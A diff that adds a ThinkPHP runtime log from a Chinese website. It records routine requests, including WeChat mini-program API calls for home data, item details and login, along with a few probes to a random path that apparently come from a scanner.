+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.3',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+  'host' => '123.206.57.217',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T08:33:58+08:00 ] 106.3.132.184 GET 123.206.57.217/favicon.ico
+[运行时间：0.045317s] [吞吐率：22.07req/s] [内存消耗：2,677.53kb] [文件加载：73]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000036s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002637s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001100s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000047s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip;q=1.0, br;q=0.8, *;q=0.5',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.3',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+  'host' => '123.206.57.217',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T08:39:55+08:00 ] 129.211.164.19 GET 001.shanxi0357.cn/
+[运行时间：0.062648s] [吞吐率：15.96req/s] [内存消耗：3,545.83kb] [文件加载：88]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000032s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.004060s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001153s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000039s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'upgrade-insecure-requests' => '1',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002343s ]
+[ info ] [ BEHAVIOR ] Run \addons\summernote\Summernote @config_init [ RunTime:0.000242s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/001.shanxi0357.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T08:39:55+08:00 ] 180.101.244.16 GET 001.shanxi0357.cn/
+[运行时间：0.059940s] [吞吐率：16.68req/s] [内存消耗：3,544.06kb] [文件加载：88]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000031s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002537s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000906s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000035s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'upgrade-insecure-requests' => '1',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002445s ]
+[ info ] [ BEHAVIOR ] Run \addons\summernote\Summernote @config_init [ RunTime:0.000243s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/001.shanxi0357.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T10:28:55+08:00 ] 110.182.158.20 GET 001.shanxi0357.cn/api/home?user_id=3
+[运行时间：0.085142s] [吞吐率：11.75req/s] [内存消耗：4,109.62kb] [文件加载：88]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000034s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002570s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000915s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000042s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'home',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.41(0x1800292c) NetType/WIFI Language/zh_CN',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'user_id' => '3',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002279s ]
+[ info ] [ RUN ] app\api\controller\Home->index[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/Home.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T10:28:55+08:00 ] 110.182.158.20 GET 001.shanxi0357.cn/api/user/login?code=0d183w0w31Adj13tDU0w3FOgcd483w0-
+[运行时间：0.318170s] [吞吐率：3.14req/s] [内存消耗：4,382.34kb] [文件加载：93]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000032s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002536s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001005s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000043s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'user',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.41(0x1800292c) NetType/WIFI Language/zh_CN',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'code' => '0d183w0w31Adj13tDU0w3FOgcd483w0-',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002396s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn/user.php
+[ info ] [ RUN ] app\api\controller\User->login[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/User.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T10:29:00+08:00 ] 110.182.158.20 GET 001.shanxi0357.cn/api/home/getDetail?id=22
+[运行时间：0.072144s] [吞吐率：13.86req/s] [内存消耗：4,098.70kb] [文件加载：88]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000033s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002551s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000934s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000066s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'home',
+    2 => 'getDetail',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.41(0x1800292c) NetType/WIFI Language/zh_CN',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'id' => '22',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002381s ]
+[ info ] [ RUN ] app\api\controller\Home->getDetail[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/Home.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T10:29:12+08:00 ] 110.182.158.20 GET 001.shanxi0357.cn/api/home/getDetail?id=18
+[运行时间：0.076030s] [吞吐率：13.15req/s] [内存消耗：4,098.70kb] [文件加载：88]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000040s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002512s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000939s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000045s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'home',
+    2 => 'getDetail',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.41(0x1800292c) NetType/WIFI Language/zh_CN',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'id' => '18',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002319s ]
+[ info ] [ RUN ] app\api\controller\Home->getDetail[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/Home.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T10:31:05+08:00 ] 110.182.158.20 GET 001.shanxi0357.cn/api/home/getDetail?id=18
+[运行时间：0.072215s] [吞吐率：13.85req/s] [内存消耗：4,098.70kb] [文件加载：88]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000083s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002601s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001003s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000044s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'home',
+    2 => 'getDetail',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.41(0x1800292c) NetType/WIFI Language/zh_CN',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'id' => '18',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002396s ]
+[ info ] [ RUN ] app\api\controller\Home->getDetail[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/Home.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T10:31:09+08:00 ] 110.182.158.20 GET 001.shanxi0357.cn/api/home/getDetail?id=24
+[运行时间：0.075750s] [吞吐率：13.20req/s] [内存消耗：4,098.70kb] [文件加载：88]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000033s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003755s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001426s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000065s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'home',
+    2 => 'getDetail',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.41(0x1800292c) NetType/WIFI Language/zh_CN',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'id' => '24',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.003475s ]
+[ info ] [ RUN ] app\api\controller\Home->getDetail[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/Home.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T10:31:18+08:00 ] 110.182.158.20 GET 001.shanxi0357.cn/api/home/getDetail?id=21
+[运行时间：0.080217s] [吞吐率：12.47req/s] [内存消耗：4,098.70kb] [文件加载：88]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000036s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.004014s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001053s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000044s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'home',
+    2 => 'getDetail',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.41(0x1800292c) NetType/WIFI Language/zh_CN',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'id' => '21',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002450s ]
+[ info ] [ RUN ] app\api\controller\Home->getDetail[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/Home.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T13:52:50+08:00 ] 36.32.2.163 GET 123.206.57.217:443/
+[运行时间：0.075138s] [吞吐率：13.31req/s] [内存消耗：3,541.21kb] [文件加载：88]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000038s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002732s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000944s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000031s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '123.206.57.217:443',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002290s ]
+[ info ] [ BEHAVIOR ] Run \addons\summernote\Summernote @config_init [ RunTime:0.000212s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/001.shanxi0357.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/001.shanxi0357.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T15:27:27+08:00 ] 106.75.147.6 GET 123.206.57.217:443/dqgqoeCXckuwPtxov
+[运行时间：0.045079s] [吞吐率：22.18req/s] [内存消耗：2,674.34kb] [文件加载：73]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000038s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002391s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.000921s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000056s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'dqgqoeCXckuwPtxov',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'IYBCWWS=QdoXqSK71zRwE7UZ67pRZIxg/P8f1Pju7wOjavkA9v+nC2cg3jsdX5bAq4dfq6YpIRNUaUw7sjmau0ugv1lkYJXUt4bXlNXL4lSXUNAIFkpSkZteBCyCfNOW8RYCPlYu2yEwkRqaYftX4zjNi2BgqAOha0WzS4IhJb6HAIwEVitTYo4mp8YQnmxTcj0M9oDlSk35E4wWWrs3gdtkd1E9I/ccGlQ+DeMrOdQrnYD3cB+YgaHfnt0UJs8AM90QmNpLCr79Cc9elsznYvrf4g4SFsJ+dt8e',
+  'cache-control' => 'no-cache',
+  'host' => '123.206.57.217:443',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T15:27:27+08:00 ] 106.75.147.6 GET 123.206.57.217:443/dqgqoeCXckuwPtxov
+[运行时间：0.044384s] [吞吐率：22.53req/s] [内存消耗：2,674.53kb] [文件加载：73]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000035s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002615s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001042s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000037s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'dqgqoeCXckuwPtxov',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'Y=DnyP5/s0JCRbgFZfv+L49q5hjuwhM+cfmrOUmC/Qj+hsWi3MPFPhoKX6YY4QR3xq3LXYBSuYMohEoVpn99O7aHg6El3UXR46+T7GyRx6pG/PeAROHwJNFnv+ShXtJyXIpvRaxxHicC+NyQv6Wj7lIAVF76Vu16/MNpIxuTQl5dKXxUSDspRmYq6Qrfzu77PqvFYLSLEUKYnVrpIji2EhWAyvbB8sNyJVtOrbHqUIkNdp5QClV05ZV/j9CFf3eyujxfKJYqjX2NQLZos4PqE/G612ixvROlyuB+IgILK0zSSV+28=',
+  'cache-control' => 'no-cache',
+  'host' => '123.206.57.217:443',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T15:50:12+08:00 ] 110.182.158.20 GET 001.shanxi0357.cn/api/home?user_id=3
+[运行时间：0.101341s] [吞吐率：9.87req/s] [内存消耗：4,109.62kb] [文件加载：88]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000045s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003520s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001235s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000057s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'home',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.41(0x1800292c) NetType/WIFI Language/zh_CN',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'user_id' => '3',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.003476s ]
+[ info ] [ RUN ] app\api\controller\Home->index[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/Home.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-09-08T15:50:12+08:00 ] 110.182.158.20 GET 001.shanxi0357.cn/api/user/login?code=0d19Na100jwyFQ15zK100HkTci09Na1l
+[运行时间：0.293345s] [吞吐率：3.41req/s] [内存消耗：4,382.34kb] [文件加载：93]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000049s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.004068s ]
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_init [ RunTime:0.001578s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @app_dispatch [ RunTime:0.000066s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'user',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx60ef57f6ef1f463e/0/page-frame.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.41(0x1800292c) NetType/WIFI Language/zh_CN',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'connection' => 'keep-alive',
+  'host' => '001.shanxi0357.cn',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'code' => '0d19Na100jwyFQ15zK100HkTci09Na1l',
+)
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.003823s ]
+[ info ] [ LANG ] /www/wwwroot/001.shanxi0357.cn/public/../application/api/lang/zh-cn/user.php
+[ info ] [ RUN ] app\api\controller\User->login[ /www/wwwroot/001.shanxi0357.cn/application/api/controller/User.php ]
